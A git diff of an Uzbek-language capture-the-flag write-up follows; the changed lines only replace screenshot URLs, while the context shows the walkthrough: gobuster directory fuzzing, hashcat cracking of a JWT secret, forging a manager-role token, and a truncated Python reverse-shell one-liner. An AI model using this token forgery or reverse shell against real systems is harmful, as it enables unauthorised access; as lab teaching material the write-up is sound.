@@ -31,7 +31,7 @@ Bu challenge bir nechta zaifliklarni o'z ichiga oladi:
 
 ---
 
-<img width="1683" height="924" alt="1" src="https://github.com/user-attachments/assets/dc507bd7-180f-493d-a055-82005a0ff111" />
+<img width="1683" height="924" alt="1" src="https://github.com/user-attachments/assets/de6a5737-0f34-451f-bb44-7a53a6217b46" />
 
 ## 1. Reconnaissance — Directory Fuzzing
 
@@ -48,7 +48,7 @@ gobuster dir -u http://192.168.68.178/ -w /usr/share/wordlists/dirb/common.txt -
 
 Ushbu credentials yordamida veb saytga muvaffaqiyatli autentifikatsiyadan o'tdik.
 
-<img width="599" height="321" alt="2" src="https://github.com/user-attachments/assets/c9edad79-a1f8-4ea9-a081-929b240bb778" />
+<img width="599" height="321" alt="2" src="https://github.com/user-attachments/assets/1102f0f2-fd87-4640-b236-75ee6e41c0da" />
 
 ---
 
@@ -58,7 +58,7 @@ Dashboard'da Pingvinga xabar yuborish funksiyasi mavjudligi aniqlandi. Biroq, jo
 
 **Maqsad:** Yuqori huquqli foydalanuvchi sifatida tizimga kirish.
 
-<img width="1688" height="930" alt="3" src="https://github.com/user-attachments/assets/0bf85fe9-d8e6-40f3-80d6-cf1791f800eb" />
+<img width="1688" height="930" alt="3" src="https://github.com/user-attachments/assets/fb31d6a4-a492-43da-b17a-b57eee9e2249" />
 
 ---
 
@@ -72,8 +72,8 @@ hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 
 **Natija:** JWT ning `secret key` muvaffaqiyatli topildi.
 
-<img width="1643" height="673" alt="4" src="https://github.com/user-attachments/assets/083a3e78-f668-4d86-8ecb-3470aac1c09d" />
-<img width="1656" height="541" alt="5" src="https://github.com/user-attachments/assets/a7173bff-7b5e-4fa5-ba3a-89e4b08309b0" />
+<img width="1643" height="673" alt="4" src="https://github.com/user-attachments/assets/0908ff54-f3f0-488f-ba1a-2de56fd0ab91" />
+<img width="1656" height="541" alt="5" src="https://github.com/user-attachments/assets/b4534189-7f6f-4fec-a07f-862800ad8b1d" />
 
 ---
 
@@ -85,7 +85,7 @@ JWT payload ichidagi `user_id` maydoni MD5 hash ekanligini aniqladik. Uni `Crack
 
 **Natija:** Foydalanuvchi ID si ochiq ko'rinishda (plaintext) olindi.
 
-<img width="1093" height="360" alt="6" src="https://github.com/user-attachments/assets/19b29336-3611-4b28-96b1-46a42a15bd08" />
+<img width="1093" height="360" alt="6" src="https://github.com/user-attachments/assets/2ea1ecef-471c-4c8d-ab58-41b3f318e8c3" />
 
 ---
 
@@ -99,7 +99,7 @@ GET /me?user_id=<md5_hash>
 
 Javoblar o'rganilganda **roli `manager`** bo'lgan `NavkarX` foydalanuvchisi aniqlandi.
 
-<img width="1066" height="367" alt="7" src="https://github.com/user-attachments/assets/a41c81cd-b27b-483c-abb6-fe42b8b9e5f1" />
+<img width="1066" height="367" alt="7" src="https://github.com/user-attachments/assets/0b3ec25b-5929-480b-84fd-859c43cc0b19" />
 
 ---
 
@@ -111,7 +111,7 @@ Bizda JWT ning `secret key` mavjud bo'lganligi uchun `NavkarX` (manager) foydala
 
 Token payload'iga `NavkarX`-ning `user_id` va `role: manager` qiymatlarini joylashtirib, secret key bilan imzoladik.
 
-<img width="1162" height="753" alt="8" src="https://github.com/user-attachments/assets/9c69f960-f8a7-4fb8-b62c-28ce30a3c599" />
+<img width="1162" height="753" alt="8" src="https://github.com/user-attachments/assets/75f35df7-7e10-4667-b13f-a2c01f8c959a" />
 
 ---
 
@@ -121,7 +121,7 @@ Yaratilgan yangi JWT tokenni `localStorage`-ga o'rnatib, sahifani yangilaganimiz
 
 **Natija:** Pingvinga xabar yuborish funksiyasidan foydalanish mumkin!
 
-<img width="1686" height="888" alt="9" src="https://github.com/user-attachments/assets/2cad418e-e43a-4fe6-830d-286853169375" />
+<img width="1686" height="888" alt="9" src="https://github.com/user-attachments/assets/0078d3fa-a367-408c-af32-5a24f8f22e7f" />
 
 ---
 
@@ -141,9 +141,9 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 **Natija:** Muvaffaqiyatli reverse shell olindi! 🎉
 
-<img width="1681" height="927" alt="10" src="https://github.com/user-attachments/assets/6352d557-285f-426e-ad5f-e5459a9a5968" />
+<img width="1681" height="927" alt="10" src="https://github.com/user-attachments/assets/82ec20c3-b8b1-483a-8e76-b599cec3392b" />
 
-<img width="658" height="240" alt="11" src="https://github.com/user-attachments/assets/fdb57fdc-d873-4a7f-9815-a47e3f483630" />
+<img width="658" height="240" alt="11" src="https://github.com/user-attachments/assets/55b04efb-62ff-484e-800e-c43dccd2a314" />
 
 ---
 
